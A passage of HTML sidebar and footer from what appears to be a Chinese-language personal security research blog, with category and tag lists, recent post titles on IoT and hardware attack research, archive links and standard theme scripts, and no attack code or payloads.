class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">WEB安全</span></span><span class="level-end"><span class="level-item tag">23</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">二进制安全</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">内网渗透</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">协议分析</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="level-start"><span class="level-item">反序列化</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="level-start"><span class="level-item">环境配置</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="level-start"><span class="level-item">路由器</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-03T08:51:10.000Z">2020-12-03</time></p><p class="title is-6"><a class="link-muted" href="/2020/12/03/IOT/Jailbreak-Apple-T2-Chip%E7%9A%84%E7%9B%B8%E5%85%B3%E7%A0%94%E7%A9%B6/">Jailbreak_Apple_T2_Chip的相关研究</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/IOT/">IOT</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-12-01T10:06:59.000Z">2020-12-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/12/01/IOT/SGX%E6%94%BB%E5%87%BB%E6%B5%85%E8%B0%88/">SGX攻击浅谈</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/IOT/">IOT</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-11-28T02:56:23.000Z">2020-11-28</time></p><p class="title is-6"><a class="link-muted" href="/2020/11/28/IOT/DMA%E6%94%BB%E5%87%BB%E5%92%8CThunderbolt-3%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%B5%85%E8%B0%88/">DMA攻击和Thunderbolt 3安全级别浅谈</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/IOT/">IOT</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-10-14T07:17:42.000Z">2020-10-14</time></p><p class="title is-6"><a class="link-muted" href="/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/">使用Ubertooth one扫描嗅探低功耗蓝牙</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/IOT/">IOT</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-09-24T09:39:19.000Z">2020-09-24</time></p><p class="title is-6"><a class="link-muted" href="/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">蓝牙安全以及相关漏洞研究</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/IOT/">IOT</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/12/"><span class="level-start"><span class="level-item">December 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/10/"><span class="level-start"><span class="level-item">October 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/09/"><span class="level-start"><span class="level-item">September 2020</span></span><span class="level-end"><span class="level-item tag">50</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/06/"><span class="level-start"><span class="level-item">June 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/12/"><span class="level-start"><span class="level-item">December 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/06/"><span class="level-start"><span class="level-item">June 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/05/"><span class="level-start"><span class="level-item">May 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2018/03/"><span class="level-start"><span class="level-item">March 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/360/"><span class="tag">360</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AWD/"><span class="tag">AWD</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Amazon/"><span class="tag">Amazon</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Android/"><span class="tag">Android</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache/"><span class="tag">Apache</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache-Cocoon-XML/"><span class="tag">Apache-Cocoon-XML</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apple-T2/"><span class="tag">Apple T2</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BLE/"><span class="tag">BLE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BadUsb/"><span class="tag">BadUsb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cisco/"><span class="tag">Cisco</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/DMA/"><span class="tag">DMA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Drozer/"><span class="tag">Drozer</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/EDR/"><span class="tag">EDR</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exchange-Server/"><span class="tag">Exchange-Server</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Frida/"><span class="tag">Frida</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Google-Hacking/"><span class="tag">Google-Hacking</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE/"><span class="tag">HTTP请求走私协议</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hook/"><span class="tag">Hook</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Horde-Groupware-Webmail-Edition/"><span class="tag">Horde Groupware Webmail Edition</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Huawei/"><span class="tag">Huawei</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/IOT/"><span class="tag">IOT</span><span class="tag is-grey-lightest">17</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JCG/"><span class="tag">JCG</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MSF/"><span class="tag">MSF</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mac-os/"><span class="tag">Mac os</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mybatis/"><span class="tag">Mybatis</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mysql-python/"><span class="tag">Mysql-python</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/NC/"><span class="tag">NC</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP%E7%BD%91%E7%AB%99/"><span class="tag">PHP网站</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PhpStudy/"><span class="tag">PhpStudy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Pligg/"><span class="tag">Pligg</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PowerSploit/"><span class="tag">PowerSploit</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SDK/"><span class="tag">SDK</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SGX/"><span class="tag">SGX</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Sql%E6%B3%A8%E5%85%A5/"><span class="tag">Sql注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Thunderbolt-3/"><span class="tag">Thunderbolt 3</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Ubertooth-one/"><span class="tag">Ubertooth one</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VIM/"><span class="tag">VIM</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/VPN/"><span class="tag">VPN</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XiaoMi/"><span class="tag">XiaoMi</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ZTE/"><span class="tag">ZTE</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crunch/"><span class="tag">crunch</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/iot/"><span class="tag">iot</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">java反序列化</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"><span class="tag">nginx解析漏洞</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sangfor/"><span class="tag">sangfor</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/scrcpy/"><span class="tag">scrcpy</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tag">sql注入</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%89%E6%98%9F/"><span class="tag">三星</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"><span class="tag">代理转发</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tag">内网渗透</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"><span class="tag">协议分析</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"><span class="tag">后渗透</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A0%86/"><span class="tag">堆</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%A4%A9%E8%9E%8D%E4%BF%A1/"><span class="tag">天融信</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"><span class="tag">宏病毒</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AE%9D%E5%A1%94/"><span class="tag">宝塔</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"><span class="tag">未授权访问漏洞</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B3%9B%E5%BE%AEOA/"><span class="tag">泛微OA</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%A8%E5%8F%8B/"><span class="tag">用友</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"><span class="tag">红队百科全书</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%BF%E7%9B%9F/"><span class="tag">绿盟</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%93%9D%E7%89%99/"><span class="tag">蓝牙</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="tag">路由器</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%80%9A%E8%BE%BEOA/"><span class="tag">通达OA</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81/"><span class="tag">默认密码</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/"><span class="tag">齐治堡垒机</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Advertisement</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="1" data-ad-slot="1" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="ol4three" height="28"></a><p class="size-small"><span>&copy; 2020 ol4three</span>  Powered by <a href="https://www.ol4three.com" target="_blank" rel="noopener">ol4three</a> <br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>